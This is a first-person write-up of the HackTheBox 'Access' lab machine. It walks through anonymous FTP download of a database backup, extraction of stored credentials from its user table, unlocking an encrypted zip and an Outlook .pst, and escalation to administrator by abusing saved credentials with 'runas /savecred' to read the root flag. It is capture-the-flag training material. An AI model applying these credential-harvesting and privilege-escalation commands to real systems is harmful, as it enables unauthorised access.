This is the first writeup in the series.
After accessing to http://10.10.10.98/ we get a picture of servers and a title named "LON-MC6". 
Searching in the internet for the name results in a server name. Basically, we have nothing else in the webiste.
The source code is empty.

First thing we do is to scan our address for open ports with nmap. We find that ports 23 and 21 are open. In addition, nmap indicates that anonymous login is enabled for the ftp server. So we login and wallah, there are 2 files! I tried to download the the second file (from Engineer folder). It was broken.
Okay, so after searching on the internet, I've figured that the default download way for my ftp client ('ftp' in debian) is ASCII where is the targeted file should be downloaded as binary. 
```ftp> lcd /root/Documents
Local directory now /root/Documents  //Desired destination on local machine
ftp> binary
---> TYPE I
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
---> PORT 10,10,13,77,235,177
200 PORT command successful.
---> RETR backup.mdb
125 Data connection already open; Transfer starting.
226 Transfer complete.
5652480 bytes received in 13.63 secs (405.0628 kB/s)
```
Now in order to handle mdb files, we need to install mdbtools. Kali linux has it preinstall. Let's dive into the file:
```
mdb-schema backup.mdb
.
.
.
(alot of tables)
```
We have alot of data. Obviously we want to have username and password for the ftp server. Let's find the password field:
```
root@kali:~/Documents# mdb-schema backup.mdb | awk -vRS='' '/password/'     //looking for password field.
CREATE TABLE [auth_user]
 (
	[id]			Long Integer, 
	[username]			Text (100), 
	[password]			Text (100), 
	[Status]			Long Integer, 
	[last_login]			DateTime, 
	[RoleID]			Long Integer, 
	[Remark]			Memo/Hyperlink (255)
);
```
Now we know the interesting table name - auth_users.
Let's export it and see what we have:
```
root@kali:~/Documents# mdb-export backup.mdb auth_user
id,username,password,Status,last_login,RoleID,Remark
25,"admin","**",1,"08/23/18 21:11:47",26,
27,"engineer","**",1,"08/23/18 21:13:36",26,
28,"backup_admin","**",1,"08/23/18 21:14:02",26,
```
I thought these credentials would log me into the ftp server, but it seems that the ftp server is configured to anonymous logins only. I guess we are left only with the second file, so I downloaded it. It is encrypted with AES and the default linux unzip program doesn't support password extraction of this kind (the file was probably encrypted in Windows system). Therefore, one can download a tool called 7z. Kali comes with it preloaded. I tried engineer's password (the file was located in Engineer) and it worked:
```
ftp>get 'Access Control.zip'
root@kali:~/Documents# 7z x control.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,1 CPU Intel(R) Core(TM) i7-7500U CPU @ 2.70GHz (806E9),ASM,AES-NI)

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: control.zip
--
Path = control.zip
Type = zip
Physical Size = 10870

    
Enter password (will not be echoed):
Everything is Ok         

Size:       271360
Compressed: 10870
```
Now we have a .pst file, which is Microsoft Outlook email folder. Googling for it leads to a program named readpst:
```
root@kali:~/Documents# readpst 'Access Control.pst' 
Opening PST file and indexes...
Processing Folder "Deleted Items"
	"Access Control" - 2 items done, 0 items skipped.
```
Now we have the email file itself. It contains a username and a password. It's probably for the telnet. Let's proceeed:
```
C:\Users\security\Desktop>type user.txt
***
```
This file has the user flag. We owned user. Now to root:
This took me a few hours, as I don't have expirience with windows. I got a few hints for hackthebox.eu and understood the following:
cmdkey /list allows us the see the credentials stored in the computer. THey might be only for one session or forever. This basially allows the run files with credentials without entering the password each time. running cmdkey /list shows that the password for administrator user is stored. That allows us the run files with admin privilege, in other words: we have a huge vulnerability.
The trick here is to copy the contents of root.txt file to security's folder.
We don't know where is root.txt file is, so we will first find it. We will use the function 'runas' which allows us to run programs with different profiles:
```
C:\Users\security\Desktop>runas /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c dir c:\users\administrator\ /s /b>c:\users\security\desktop\files.txt"
```
/savecred allows us to bypass the password promptt and use admin's credentials. We run cmd.exe with admin prevs and copy all files & folders addresses into files.txt file. We want to find root.txt now:
```
C:\Users\security\Desktop>type files.txt | find "root.txt"
c:\users\administrator\AppData\Roaming\Microsoft\Windows\Recent\root.txt.lnk
c:\users\administrator\Desktop\root.txt
```
Okay, it's in desktop. Now we will copy the contents of it into a file which is in security's desktop:
```
C:\Users\security\Desktop>runas /user:ACCESS\Administrator /savecred "c:\windows\system32\cmd.exe /c type c:\users\administrator\desktop\root.txt>c:\users\security\desktop\root.txt"
```
The flag is now in root.txt. We owned root.

*I read that there are additional methods involving metasploit, maybe I will add these later on when I will gain more knowledge in windows*

```



